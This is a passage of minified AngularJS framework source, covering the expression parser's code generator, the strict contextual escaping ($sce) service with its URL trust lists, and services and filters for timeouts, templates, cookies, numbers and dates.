i,r="";if(this.stage="assign",i=xr(t)){this.state.computing="assign";var n=this.nextId();this.recurse(i,n),this.return_(n),r="fn.assign="+this.generateFunction("assign","s,v,l")}var s=Ir(t.body);e.stage="inputs",S(s,(function(t,i){var r="fn"+i;e.state[r]={vars:[],body:[],own:{}},e.state.computing=r;var n=e.nextId();e.recurse(t,n),e.return_(n),e.state.inputs.push({name:r,isPure:t.isPure}),t.watchId=i})),this.state.computing="fn",this.stage="main",this.recurse(t);var o='"'+this.USE+" "+this.STRICT+'";\n'+this.filterPrefix()+"var fn="+this.generateFunction("fn","s,l,a,i")+r+this.watchFns()+"return fn;",a=new Function("$filter","getStringValue","ifDefined","plus",o)(this.$filter,br,Cr,Tr);return this.state=this.stage=void 0,a},USE:"use",STRICT:"strict",watchFns:function(){var t=[],e=this.state.inputs,i=this;return S(e,(function(e){t.push("var "+e.name+"="+i.generateFunction(e.name,"s")),e.isPure&&t.push(e.name,".isPure="+JSON.stringify(e.isPure)+";")})),e.length&&t.push("fn.inputs=["+e.map((function(t){return t.name})).join(",")+"];"),t.join("")},generateFunction:function(t,e){return"function("+e+"){"+this.varsPrefix(t)+this.body(t)+"};"},filterPrefix:function(){var t=[],e=this;return S(this.state.filters,(function(i,r){t.push(i+"=$filter("+e.escape(r)+")")})),t.length?"var "+t.join(",")+";":""},varsPrefix:function(t){return this.state[t].vars.length?"var "+this.state[t].vars.join(",")+";":""},body:function(t){return this.state[t].body.join("")},recurse:function(t,e,i,r,n,s){var o,a,l,h,c,u=this;if(r=r||D,!s&&V(t.watchId))return e=e||this.nextId(),void this.if_("i",this.lazyAssign(e,this.computedMember("i",t.watchId)),this.lazyRecurse(t,e,i,r,n,!0));switch(t.type){case Ar.Program:S(t.body,(function(e,i){u.recurse(e.expression,void 0,void 0,(function(t){a=t})),i!==t.body.length-1?u.current().body.push(a,";"):u.return_(a)}));break;case Ar.Literal:h=this.escape(t.value),this.assign(e,h),r(e||h);break;case Ar.UnaryExpression:this.recurse(t.argument,void 0,void 0,(function(t){a=t})),h=t.operator+"("+this.ifDefined(a,0)+")",this.assign(e,h),r(h);break;case Ar.BinaryExpression:this.recurse(t.left,void 0,void 0,(function(t){o=t})),this.recurse(t.right,void 0,void 0,(function(t){a=t})),h="+"===t.operator?this.plus(o,a):"-"===t.operator?this.ifDefined(o,0)+t.operator+this.ifDefined(a,0):"("+o+")"+t.operator+"("+a+")",this.assign(e,h),r(h);break;case Ar.LogicalExpression:e=e||this.nextId(),u.recurse(t.left,e),u.if_("&&"===t.operator?e:u.not(e),u.lazyRecurse(t.right,e)),r(e);break;case Ar.ConditionalExpression:e=e||this.nextId(),u.recurse(t.test,e),u.if_(e,u.lazyRecurse(t.alternate,e),u.lazyRecurse(t.consequent,e)),r(e);break;case Ar.Identifier:e=e||this.nextId(),i&&(i.context="inputs"===u.stage?"s":this.assign(this.nextId(),this.getHasOwnProperty("l",t.name)+"?l:s"),i.computed=!1,i.name=t.name),u.if_("inputs"===u.stage||u.not(u.getHasOwnProperty("l",t.name)),(function(){u.if_("inputs"===u.stage||"s",(function(){n&&1!==n&&u.if_(u.isNull(u.nonComputedMember("s",t.name)),u.lazyAssign(u.nonComputedMember("s",t.name),"{}")),u.assign(e,u.nonComputedMember("s",t.name))}))}),e&&u.lazyAssign(e,u.nonComputedMember("l",t.name))),r(e);break;case Ar.MemberExpression:o=i&&(i.context=this.nextId())||this.nextId(),e=e||this.nextId(),u.recurse(t.object,o,void 0,(function(){u.if_(u.notNull(o),(function(){t.computed?(a=u.nextId(),u.recurse(t.property,a),u.getStringValue(a),n&&1!==n&&u.if_(u.not(u.computedMember(o,a)),u.lazyAssign(u.computedMember(o,a),"{}")),h=u.computedMember(o,a),u.assign(e,h),i&&(i.computed=!0,i.name=a)):(n&&1!==n&&u.if_(u.isNull(u.nonComputedMember(o,t.property.name)),u.lazyAssign(u.nonComputedMember(o,t.property.name),"{}")),h=u.nonComputedMember(o,t.property.name),u.assign(e,h),i&&(i.computed=!1,i.name=t.property.name))}),(function(){u.assign(e,"undefined")})),r(e)}),!!n);break;case Ar.CallExpression:e=e||this.nextId(),t.filter?(a=u.filter(t.callee.name),l=[],S(t.arguments,(function(t){var e=u.nextId();u.recurse(t,e),l.push(e)})),h=a+"("+l.join(",")+")",u.assign(e,h),r(e)):(a=u.nextId(),o={},l=[],u.recurse(t.callee,a,o,(function(){u.if_(u.notNull(a),(function(){S(t.arguments,(function(e){u.recurse(e,t.constant?void 0:u.nextId(),void 0,(function(t){l.push(t)}))})),h=o.name?u.member(o.context,o.name,o.computed)+"("+l.join(",")+")":a+"("+l.join(",")+")",u.assign(e,h)}),(function(){u.assign(e,"undefined")})),r(e)})));break;case Ar.AssignmentExpression:a=this.nextId(),o={},this.recurse(t.left,void 0,o,(function(){u.if_(u.notNull(o.context),(function(){u.recurse(t.right,a),h=u.member(o.context,o.name,o.computed)+t.operator+a,u.assign(e,h),r(e||h)}))}),1);break;case Ar.ArrayExpression:l=[],S(t.elements,(function(e){u.recurse(e,t.constant?void 0:u.nextId(),void 0,(function(t){l.push(t)}))})),h="["+l.join(",")+"]",this.assign(e,h),r(e||h);break;case Ar.ObjectExpression:l=[],c=!1,S(t.properties,(function(t){t.computed&&(c=!0)})),c?(e=e||this.nextId(),this.assign(e,"{}"),S(t.properties,(function(t){t.computed?(o=u.nextId(),u.recurse(t.key,o)):o=t.key.type===Ar.Identifier?t.key.name:""+t.key.value,a=u.nextId(),u.recurse(t.value,a),u.assign(u.member(e,o,t.computed),a)}))):(S(t.properties,(function(e){u.recurse(e.value,t.constant?void 0:u.nextId(),void 0,(function(t){l.push(u.escape(e.key.type===Ar.Identifier?e.key.name:""+e.key.value)+":"+t)}))})),h="{"+l.join(",")+"}",this.assign(e,h)),r(e||h);break;case Ar.ThisExpression:this.assign(e,"s"),r(e||"s");break;case Ar.LocalsExpression:this.assign(e,"l"),r(e||"l");break;case Ar.NGValueParameter:this.assign(e,"v"),r(e||"v")}},getHasOwnProperty:function(t,e){var i=t+"."+e,r=this.current().own;return r.hasOwnProperty(i)||(r[i]=this.nextId(!1,t+"&&("+this.escape(e)+" in "+t+")")),r[i]},assign:function(t,e){if(t)return this.current().body.push(t,"=",e,";"),t},filter:function(t){return this.state.filters.hasOwnProperty(t)||(this.state.filters[t]=this.nextId(!0)),this.state.filters[t]},ifDefined:function(t,e){return"ifDefined("+t+","+this.escape(e)+")"},plus:function(t,e){return"plus("+t+","+e+")"},return_:function(t){this.current().body.push("return ",t,";")},if_:function(t,e,i){if(!0===t)e();else{var r=this.current().body;r.push("if(",t,"){"),e(),r.push("}"),i&&(r.push("else{"),i(),r.push("}"))}},not:function(t){return"!("+t+")"},isNull:function(t){return t+"==null"},notNull:function(t){return t+"!=null"},nonComputedMember:function(t,e){return/^[$_a-zA-Z][$_a-zA-Z0-9]*$/.test(e)?t+"."+e:t+'["'+e.replace(/[^$_a-zA-Z0-9]/g,this.stringEscapeFn)+'"]'},computedMember:function(t,e){return t+"["+e+"]"},member:function(t,e,i){return i?this.computedMember(t,e):this.nonComputedMember(t,e)},getStringValue:function(t){this.assign(t,"getStringValue("+t+")")},lazyRecurse:function(t,e,i,r,n,s){var o=this;return function(){o.recurse(t,e,i,r,n,s)}},lazyAssign:function(t,e){var i=this;return function(){i.assign(t,e)}},stringEscapeRegex:/[^ a-zA-Z0-9]/g,stringEscapeFn:function(t){return"\\u"+("0000"+t.charCodeAt(0).toString(16)).slice(-4)},escape:function(t){if(U(t))return"'"+t.replace(this.stringEscapeRegex,this.stringEscapeFn)+"'";if(W(t))return t.toString();if(!0===t)return"true";if(!1===t)return"false";if(null===t)return"null";if(void 0===t)return"undefined";throw vr("esc","IMPOSSIBLE")},nextId:function(t,e){var i="v"+this.state.nextId++;return t||this.current().vars.push(i+(e?"="+e:"")),i},current:function(){return this.state[this.state.computing]}},Or.prototype={compile:function(t){var e,i,r=this;$r(t,r.$filter),(e=xr(t))&&(i=this.recurse(e));var n,s=Ir(t.body);s&&(n=[],S(s,(function(t,e){var i=r.recurse(t);i.isPure=t.isPure,t.input=i,n.push(i),t.watchId=e})));var o=[];S(t.body,(function(t){o.push(r.recurse(t.expression))}));var a=0===t.body.length?D:1===t.body.length?o[0]:function(t,e){var i;return S(o,(function(r){i=r(t,e)})),i};return i&&(a.assign=function(t,e,r){return i(t,r,e)}),n&&(a.inputs=n),a},recurse:function(t,e,i){var r,n,s,o=this;if(t.input)return this.inputs(t.input,t.watchId);switch(t.type){case Ar.Literal:return this.value(t.value,e);case Ar.UnaryExpression:return n=this.recurse(t.argument),this["unary"+t.operator](n,e);case Ar.BinaryExpression:case Ar.LogicalExpression:return r=this.recurse(t.left),n=this.recurse(t.right),this["binary"+t.operator](r,n,e);case Ar.ConditionalExpression:return this["ternary?:"](this.recurse(t.test),this.recurse(t.alternate),this.recurse(t.consequent),e);case Ar.Identifier:return o.identifier(t.name,e,i);case Ar.MemberExpression:return r=this.recurse(t.object,!1,!!i),t.computed||(n=t.property.name),t.computed&&(n=this.recurse(t.property)),t.computed?this.computedMember(r,n,e,i):this.nonComputedMember(r,n,e,i);case Ar.CallExpression:return s=[],S(t.arguments,(function(t){s.push(o.recurse(t))})),t.filter&&(n=this.$filter(t.callee.name)),t.filter||(n=this.recurse(t.callee,!0)),t.filter?function(t,i,r,o){for(var a=[],l=0;l<s.length;++l)a.push(s[l](t,i,r,o));var h=n.apply(void 0,a,o);return e?{context:void 0,name:void 0,value:h}:h}:function(t,i,r,o){var a,l=n(t,i,r,o);if(null!=l.value){for(var h=[],c=0;c<s.length;++c)h.push(s[c](t,i,r,o));a=l.value.apply(l.context,h)}return e?{value:a}:a};case Ar.AssignmentExpression:return r=this.recurse(t.left,!0,1),n=this.recurse(t.right),function(t,i,s,o){var a=r(t,i,s,o),l=n(t,i,s,o);return a.context[a.name]=l,e?{value:l}:l};case Ar.ArrayExpression:return s=[],S(t.elements,(function(t){s.push(o.recurse(t))})),function(t,i,r,n){for(var o=[],a=0;a<s.length;++a)o.push(s[a](t,i,r,n));return e?{value:o}:o};case Ar.ObjectExpression:return s=[],S(t.properties,(function(t){t.computed?s.push({key:o.recurse(t.key),computed:!0,value:o.recurse(t.value)}):s.push({key:t.key.type===Ar.Identifier?t.key.name:""+t.key.value,computed:!1,value:o.recurse(t.value)})})),function(t,i,r,n){for(var o={},a=0;a<s.length;++a)s[a].computed?o[s[a].key(t,i,r,n)]=s[a].value(t,i,r,n):o[s[a].key]=s[a].value(t,i,r,n);return e?{value:o}:o};case Ar.ThisExpression:return function(t){return e?{value:t}:t};case Ar.LocalsExpression:return function(t,i){return e?{value:i}:i};case Ar.NGValueParameter:return function(t,i,r){return e?{value:r}:r}}},"unary+":function(t,e){return function(i,r,n,s){var o=t(i,r,n,s);return o=V(o)?+o:0,e?{value:o}:o}},"unary-":function(t,e){return function(i,r,n,s){var o=t(i,r,n,s);return o=V(o)?-o:-0,e?{value:o}:o}},"unary!":function(t,e){return function(i,r,n,s){var o=!t(i,r,n,s);return e?{value:o}:o}},"binary+":function(t,e,i){return function(r,n,s,o){var a=Tr(t(r,n,s,o),e(r,n,s,o));return i?{value:a}:a}},"binary-":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o),l=e(r,n,s,o),h=(V(a)?a:0)-(V(l)?l:0);return i?{value:h}:h}},"binary*":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)*e(r,n,s,o);return i?{value:a}:a}},"binary/":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)/e(r,n,s,o);return i?{value:a}:a}},"binary%":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)%e(r,n,s,o);return i?{value:a}:a}},"binary===":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)===e(r,n,s,o);return i?{value:a}:a}},"binary!==":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)!==e(r,n,s,o);return i?{value:a}:a}},"binary==":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)==e(r,n,s,o);return i?{value:a}:a}},"binary!=":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)!=e(r,n,s,o);return i?{value:a}:a}},"binary<":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)<e(r,n,s,o);return i?{value:a}:a}},"binary>":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)>e(r,n,s,o);return i?{value:a}:a}},"binary<=":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)<=e(r,n,s,o);return i?{value:a}:a}},"binary>=":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)>=e(r,n,s,o);return i?{value:a}:a}},"binary&&":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)&&e(r,n,s,o);return i?{value:a}:a}},"binary||":function(t,e,i){return function(r,n,s,o){var a=t(r,n,s,o)||e(r,n,s,o);return i?{value:a}:a}},"ternary?:":function(t,e,i,r){return function(n,s,o,a){var l=t(n,s,o,a)?e(n,s,o,a):i(n,s,o,a);return r?{value:l}:l}},value:function(t,e){return function(){return e?{context:void 0,name:void 0,value:t}:t}},identifier:function(t,e,i){return function(r,n,s,o){var a=n&&t in n?n:r;i&&1!==i&&a&&null==a[t]&&(a[t]={});var l=a?a[t]:void 0;return e?{context:a,name:t,value:l}:l}},computedMember:function(t,e,i,r){return function(n,s,o,a){var l,h,c=t(n,s,o,a);return null!=c&&(l=br(l=e(n,s,o,a)),r&&1!==r&&c&&!c[l]&&(c[l]={}),h=c[l]),i?{context:c,name:l,value:h}:h}},nonComputedMember:function(t,e,i,r){return function(n,s,o,a){var l=t(n,s,o,a);r&&1!==r&&l&&null==l[e]&&(l[e]={});var h=null!=l?l[e]:void 0;return i?{context:l,name:e,value:h}:h}},inputs:function(t,e){return function(i,r,n,s){return s?s[e]:t(i,r,n)}}},Mr.prototype={constructor:Mr,parse:function(t){var e=this.getAst(t),i=this.astCompiler.compile(e.ast);return i.literal=function(t){return 0===t.body.length||1===t.body.length&&(t.body[0].expression.type===Ar.Literal||t.body[0].expression.type===Ar.ArrayExpression||t.body[0].expression.type===Ar.ObjectExpression)}(e.ast),i.constant=function(t){return t.constant}(e.ast),i.oneTime=e.oneTime,i},getAst:function(t){var e=!1;return":"===(t=t.trim()).charAt(0)&&":"===t.charAt(1)&&(e=!0,t=t.substring(2)),{ast:this.ast.ast(t),oneTime:e}}};var Gr=n("$sce"),zr={HTML:"html",CSS:"css",MEDIA_URL:"mediaUrl",URL:"url",RESOURCE_URL:"resourceUrl",JS:"js"},jr=/_([a-z])/g;function Yr(t){return t.replace(jr,Zt)}function Xr(t){var e=[];return V(t)&&S(t,(function(t){e.push(function(t){if("self"===t)return t;if(U(t)){if(t.indexOf("***")>-1)throw Gr("iwcard","Illegal sequence *** in string matcher.  String: {0}",t);return t=et(t).replace(/\\\*\\\*/g,".*").replace(/\\\*/g,"[^:/.?&;]*"),new RegExp("^"+t+"$")}if(Y(t))return new RegExp("^"+t.source+"$");throw Gr("imatcher",'Matchers may only be "self", string patterns or RegExp objects')}(t))})),e}function Qr(){this.SCE_CONTEXTS=zr;var e=["self"],i=[];this.trustedResourceUrlList=function(t){return arguments.length&&(e=Xr(t)),e},Object.defineProperty(this,"resourceUrlWhitelist",{get:function(){return this.trustedResourceUrlList},set:function(t){this.trustedResourceUrlList=t}}),this.bannedResourceUrlList=function(t){return arguments.length&&(i=Xr(t)),i},Object.defineProperty(this,"resourceUrlBlacklist",{get:function(){return this.bannedResourceUrlList},set:function(t){this.bannedResourceUrlList=t}}),this.$get=["$injector","$$sanitizeUri",function(r,n){var s=function(t){throw Gr("unsafe","Attempting to use an unsafe value in a safe context.")};function o(e,i){return"self"===e?function(t){return dn(t,hn)}(i)||function(e){return dn(e,t.document.baseURI?t.document.baseURI:(an||((an=t.document.createElement("a")).href=".",an=an.cloneNode(!1)),an.href))}(i):!!e.exec(i.href)}function a(t){var e=function(t){this.$$unwrapTrustedValue=function(){return t}};return t&&(e.prototype=new t),e.prototype.valueOf=function(){return this.$$unwrapTrustedValue()},e.prototype.toString=function(){return this.$$unwrapTrustedValue().toString()},e}r.has("$sanitize")&&(s=r.get("$sanitize"));var l=a(),h={};return h[zr.HTML]=a(l),h[zr.CSS]=a(l),h[zr.MEDIA_URL]=a(l),h[zr.URL]=a(h[zr.MEDIA_URL]),h[zr.JS]=a(l),h[zr.RESOURCE_URL]=a(h[zr.URL]),{trustAs:function(t,e){var i=h.hasOwnProperty(t)?h[t]:null;if(!i)throw Gr("icontext","Attempted to trust a value in invalid context. Context: {0}; Value: {1}",t,e);if(null===e||F(e)||""===e)return e;if("string"!=typeof e)throw Gr("itype","Attempted to trust a non-string value in a content requiring a string: Context: {0}",t);return new i(e)},getTrusted:function(t,r){if(null===r||F(r)||""===r)return r;var a=h.hasOwnProperty(t)?h[t]:null;if(a&&r instanceof a)return r.$$unwrapTrustedValue();if(j(r.$$unwrapTrustedValue)&&(r=r.$$unwrapTrustedValue()),t===zr.MEDIA_URL||t===zr.URL)return n(r.toString(),t===zr.MEDIA_URL);if(t===zr.RESOURCE_URL){if(function(t){var r,n,s=un(t.toString()),a=!1;for(r=0,n=e.length;r<n;r++)if(o(e[r],s)){a=!0;break}if(a)for(r=0,n=i.length;r<n;r++)if(o(i[r],s)){a=!1;break}return a}(r))return r;throw Gr("insecurl","Blocked loading resource from url not allowed by $sceDelegate policy.  URL: {0}",r.toString())}if(t===zr.HTML)return s(r);throw Gr("unsafe","Attempting to use an unsafe value in a safe context.")},valueOf:function(t){return t instanceof l?t.$$unwrapTrustedValue():t}}}]}function Kr(){var t=!0;this.enabled=function(e){return arguments.length&&(t=!!e),t},this.$get=["$parse","$sceDelegate",function(e,i){if(t&&s<8)throw Gr("iequirks","Strict Contextual Escaping does not support Internet Explorer version < 11 in quirks mode.  You can fix this by adding the text <!doctype html> to the top of your HTML document.  See http://docs.angularjs.org/api/ng.$sce for more information.");var r=Wt(zr);r.isEnabled=function(){return t},r.trustAs=i.trustAs,r.getTrusted=i.getTrusted,r.valueOf=i.valueOf,t||(r.trustAs=r.getTrusted=function(t,e){return e},r.valueOf=R),r.parseAs=function(t,i){var n=e(i);return n.literal&&n.constant?n:e(i,(function(e){return r.getTrusted(t,e)}))};var n=r.parseAs,o=r.getTrusted,a=r.trustAs;return S(zr,(function(t,e){var i=d(e);r[Yr("parse_as_"+i)]=function(e){return n(t,e)},r[Yr("get_trusted_"+i)]=function(e){return o(t,e)},r[Yr("trust_as_"+i)]=function(e){return a(t,e)}})),r}]}function Zr(){this.$get=["$window","$document",function(t,e){var i={},r=!(!(t.nw&&t.nw.process)&&t.chrome&&(t.chrome.app&&t.chrome.app.runtime||!t.chrome.app&&t.chrome.runtime&&t.chrome.runtime.id))&&t.history&&t.history.pushState,n=k((/android (\d+)/.exec(d((t.navigator||{}).userAgent))||[])[1]),o=/Boxee/i.test((t.navigator||{}).userAgent),a=e[0]||{},l=a.body&&a.body.style,h=!1,c=!1;return l&&(h="transition"in l||"webkitTransition"in l,c="animation"in l||"webkitAnimation"in l),{history:!(!r||n<4||o),hasEvent:function(t){if("input"===t&&s)return!1;if(F(i[t])){var e=a.createElement("div");i[t]="on"+t in e}return i[t]},csp:ht(),transitions:h,animations:c,android:n}}]}function Jr(){this.$get=L((function(t){return new tn(t)}))}function tn(t){var e=this,i={},r=[],n=e.ALL_TASKS_TYPE="$$all$$",s=e.DEFAULT_TASK_TYPE="$$default$$";function o(){var t=r.pop();return t&&t.cb}function a(t){for(var e=r.length-1;e>=0;--e){var i=r[e];if(i.type===t)return r.splice(e,1),i.cb}}e.completeTask=function(e,r){r=r||s;try{e()}finally{!function(t){i[t=t||s]&&(i[t]--,i[n]--)}(r);var l=i[r],h=i[n];if(!h||!l)for(var c,u=h?a:o;c=u(r);)try{c()}catch(e){t.error(e)}}},e.incTaskCount=function(t){i[t=t||s]=(i[t]||0)+1,i[n]=(i[n]||0)+1},e.notifyWhenNoPendingTasks=function(t,e){i[e=e||n]?r.push({type:e,cb:t}):t()}}var en=n("$templateRequest");function rn(){var t;this.httpOptions=function(e){return e?(t=e,this):t},this.$get=["$exceptionHandler","$templateCache","$http","$q","$sce",function(e,i,r,n,s){function o(a,l){o.totalPendingRequests++,(!U(a)||F(i.get(a)))&&(a=s.getTrustedResourceUrl(a));var h=r.defaults&&r.defaults.transformResponse;return G(h)?h=h.filter((function(t){return t!==qi})):h===qi&&(h=null),r.get(a,P({cache:i,transformResponse:h},t)).finally((function(){o.totalPendingRequests--})).then((function(t){return i.put(a,t.data)}),(function(t){return l||(t=en("tpload","Failed to load template: {0} (HTTP status: {1} {2})",a,t.status,t.statusText),e(t)),n.reject(t)}))}return o.totalPendingRequests=0,o}]}function nn(){this.$get=["$rootScope","$browser","$location",function(t,e,i){var r={findBindings:function(t,e,i){var r=t.getElementsByClassName("ng-binding"),n=[];return S(r,(function(t){var r=b.element(t).data("$binding");r&&S(r,(function(r){i?new RegExp("(^|\\s)"+et(e)+"(\\s|\\||$)").test(r)&&n.push(t):-1!==r.indexOf(e)&&n.push(t)}))})),n},findModels:function(t,e,i){for(var r=["ng-","data-ng-","ng\\:"],n=0;n<r.length;++n){var s="["+r[n]+"model"+(i?"=":"*=")+'"'+e+'"]',o=t.querySelectorAll(s);if(o.length)return o}},getLocation:function(){return i.url()},setLocation:function(e){e!==i.url()&&(i.url(e),t.$digest())},whenStable:function(t){e.notifyWhenNoOutstandingRequests(t)}};return r}]}var sn=n("$timeout");function on(){this.$get=["$rootScope","$browser","$q","$$q","$exceptionHandler",function(t,e,i,r,n){var s={};function o(o,a,l){j(o)||(l=a,a=o,o=D);var h,c=dt(arguments,3),u=V(l)&&!l,d=(u?r:i).defer(),p=d.promise;return h=e.defer((function(){try{d.resolve(o.apply(null,c))}catch(t){d.reject(t),n(t)}finally{delete s[p.$$timeoutId]}u||t.$apply()}),a,"$timeout"),p.$$timeoutId=h,s[h]=d,p}return o.cancel=function(t){if(!t)return!1;if(!t.hasOwnProperty("$$timeoutId"))throw sn("badprom","`$timeout.cancel()` called with a promise that was not generated by `$timeout()`.");if(!s.hasOwnProperty(t.$$timeoutId))return!1;var i=t.$$timeoutId,r=s[i];return Br(r.promise),r.reject("canceled"),delete s[i],e.defer.cancel(i)},o}]}var an,ln=t.document.createElement("a"),hn=un(t.location.href);ln.href="http://[::1]";var cn="[::1]"===ln.hostname;function un(t){if(!U(t))return t;var e=t;s&&(ln.setAttribute("href",e),e=ln.href),ln.setAttribute("href",e);var i=ln.hostname;return!cn&&i.indexOf(":")>-1&&(i="["+i+"]"),{href:ln.href,protocol:ln.protocol?ln.protocol.replace(/:$/,""):"",host:ln.host,search:ln.search?ln.search.replace(/^\?/,""):"",hash:ln.hash?ln.hash.replace(/^#/,""):"",hostname:i,port:ln.port,pathname:"/"===ln.pathname.charAt(0)?ln.pathname:"/"+ln.pathname}}function dn(t,e){return t=un(t),e=un(e),t.protocol===e.protocol&&t.host===e.host}function pn(){this.$get=L(t)}function mn(t){var e=t[0]||{},i={},r="";function n(t){try{return decodeURIComponent(t)}catch(e){return t}}return function(){var t,s,o,a,l,h=function(t){try{return t.cookie||""}catch(t){return""}}(e);if(h!==r)for(t=(r=h).split("; "),i={},o=0;o<t.length;o++)(a=(s=t[o]).indexOf("="))>0&&(l=n(s.substring(0,a)),F(i[l])&&(i[l]=n(s.substring(a+1))));return i}}function fn(){this.$get=mn}function gn(t){var e="Filter";function i(r,n){if(q(r)){var s={};return S(r,(function(t,e){s[e]=i(e,t)})),s}return t.factory(r+e,n)}this.register=i,this.$get=["$injector",function(t){return function(i){return t.get(i+e)}}],i("currency",bn),i("date",On),i("filter",yn),i("json",Mn),i("limitTo",Ln),i("lowercase",Dn),i("number",wn),i("orderBy",Fn),i("uppercase",Rn)}function yn(){return function(t,e,i,r){if(!E(t)){if(null==t)return t;throw n("filter")("notarray","Expected array but received: {0}",t)}var s,o;switch(r=r||"$",_n(e)){case"function":s=e;break;case"boolean":case"null":case"number":case"string":o=!0;case"object":s=function(t,e,i,r){var n=q(t)&&i in t;return!0===e?e=lt:j(e)||(e=function(t,e){return!F(t)&&(null===t||null===e?t===e:!(q(e)||q(t)&&!N(t))&&(t=d(""+t),e=d(""+e),-1!==t.indexOf(e)))}),function(s){return n&&!q(s)?vn(s,t[i],e,i,!1):vn(s,t,e,i,r)}}(e,i,r,o);break;default:return t}return Array.prototype.filter.call(t,s)}}function vn(t,e,i,r,n,s){var o=_n(t),a=_n(e);if("string"===a&&"!"===e.charAt(0))return!vn(t,e.substring(1),i,r,n);if(G(t))return t.some((function(t){return vn(t,e,i,r,n)}));switch(o){case"object":var l;if(n){for(l in t)if(l.charAt&&"$"!==l.charAt(0)&&vn(t[l],e,i,r,!0))return!0;return!s&&vn(t,e,i,r,!1)}if("object"===a){for(l in e){var h=e[l];if(!j(h)&&!F(h)){var c=l===r;if(!vn(c?t:t[l],h,i,r,c,c))return!1}}return!0}return i(t,e);case"function":return!1;default:return i(t,e)}}function _n(t){return null===t?"null":typeof t}mn.$inject=["$document"],gn.$inject=["$provide"];function bn(t){var e=t.NUMBER_FORMATS;return function(t,i,r){F(i)&&(i=e.CURRENCY_SYM),F(r)&&(r=e.PATTERNS[1].maxFrac);var n=i?/\u00A4/g:/\s*\u00A4\s*/g;return null==t?t:En(t,e.PATTERNS[1],e.GROUP_SEP,e.DECIMAL_SEP,r).replace(n,i)}}function wn(t){var e=t.NUMBER_FORMATS;return function(t,i){return null==t?t:En(t,e.PATTERNS[0],e.GROUP_SEP,e.DECIMAL_SEP,i)}}function En(t,e,i,r,n){if(!U(t)&&!W(t)||isNaN(t))return"";var s,o=!isFinite(t),a=!1,l=Math.abs(t)+"",h="";if(o)h="∞";else{(function(t,e,i,r){var n=t.d,s=n.length-t.i,o=(e=F(e)?Math.min(Math.max(i,s),r):+e)+t.i,a=n[o];if(o>0){n.splice(Math.max(t.i,o));for(var l=o;l<n.length;l++)n[l]=0}else{s=Math.max(0,s),t.i=1,n.length=Math.max(1,o=e+1),n[0]=0;for(var h=1;h<o;h++)n[h]=0}if(a>=5)if(o-1<0){for(var c=0;c>o;c--)n.unshift(0),t.i++;n.unshift(1),t.i++}else n[o-1]++;for(;s<Math.max(0,e);s++)n.push(0);var u=n.reduceRight((function(t,e,i,r){return e+=t,r[i]=e%10,Math.floor(e/10)}),0);u&&(n.unshift(u),t.i++)})(s=function(t){var e,i,r,n,s,o=0;for((i=t.indexOf("."))>-1&&(t=t.replace(".","")),(r=t.search(/e/i))>0?(i<0&&(i=r),i+=+t.slice(r+1),t=t.substring(0,r)):i<0&&(i=t.length),r=0;"0"===t.charAt(r);r++);if(r===(s=t.length))e=[0],i=1;else{for(s--;"0"===t.charAt(s);)s--;for(i-=r,e=[],n=0;r<=s;r++,n++)e[n]=+t.charAt(r)}return i>22&&(e=e.splice(0,21),o=i-1,i=1),{d:e,e:o,i:i}}(l),n,e.minFrac,e.maxFrac);var c=s.d,u=s.i,d=s.e,p=[];for(a=c.reduce((function(t,e){return t&&!e}),!0);u<0;)c.unshift(0),u++;u>0?p=c.splice(u,c.length):(p=c,c=[0]);var m=[];for(c.length>=e.lgSize&&m.unshift(c.splice(-e.lgSize,c.length).join(""));c.length>e.gSize;)m.unshift(c.splice(-e.gSize,c.length).join(""));c.length&&m.unshift(c.join("")),h=m.join(i),p.length&&(h+=r+p.join("")),d&&(h+="e+"+d)}return t<0&&!a?e.negPre+h+e.negSuf:e.posPre+h+e.posSuf}function Sn(t,e,i,r){var n="";for((t<0||r&&t<=0)&&(r?t=1-t:(t=-t,n="-")),t=""+t;t.length<e;)t="0"+t;return i&&(t=t.substr(t.length-e)),n+t}function An(t,e,i,r,n){return i=i||0,function(s){var o=s["get"+t]();return(i>0||o>-i)&&(o+=i),0===o&&-12===i&&(o=12),Sn(o,e,r,n)}}function Cn(t,e,i){return function(r,n){var s=r["get"+t]();return n[p((i?"STANDALONE":"")+(e?"SHORT":"")+t)][s]}}function Tn(t){var e=new Date(t,0,1).getDay();return new Date(t,0,(e<=4?5:12)-e)}function $n(t){return function(e){var i=Tn(e.getFullYear()),r=+function(t){return new Date(t.getFullYear(),t.getMonth(),t.getDate()+(4-t.getDay()))}(e)-+i;return Sn(1+Math.round(r/6048e5),t)}}function In(t,e){return t.getFullYear()<=0?e.ERAS[0]:e.ERAS[1]}bn.$inject=["$locale"],wn.$inject=["$locale"];var Pn={yyyy:An("FullYear",4,0,!1,!0),yy:An("FullYear",2,0,!0,!0),y:An("FullYear",1,0,!1,!0),MMMM:Cn("Month"),MMM:Cn("Month",!0),MM:An("Month",2,1),M:An("Month",1,1),LLLL:Cn("Month",!1,!0),dd:An("Date",2),d:An("Date",1),HH:An("Hours",2),H:An("Hours",1),hh:An("Hours",2,-12),h:An("Hours",1,-12),mm:An("Minutes",2),m:An("Minutes",1),ss:An("Seconds",2),s:An("Seconds",1),sss:An("Milliseconds",3),EEEE:Cn("Day"),EEE:Cn("Day",!0),a:function(t,e){return t.getHours()<12?e.AMPMS[0]:e.AMPMS[1]},Z:function(t,e,i){var r=-1*i,n=r>=0?"+":"";return n+=Sn(Math[r>0?"floor":"ceil"](r/60),2)+Sn(Math.abs(r%60),2)},ww:$n(2),w:$n(1),G:In,GG:In,GGG:In,GGGG:function(t,e){return t.getFullYear()<=0?e.ERANAMES[0]:e.ERANAMES[1]}},xn=/((?:[^yMLdHhmsaZEwG']+)|(?:'(?:[^']|'')*')|(?:E+|y+|M+|L+|d+|H+|h+|m+|s+|a|Z|G+|w+))([\s\S]*)/,kn=/^-?\d+$/;function On(t){var 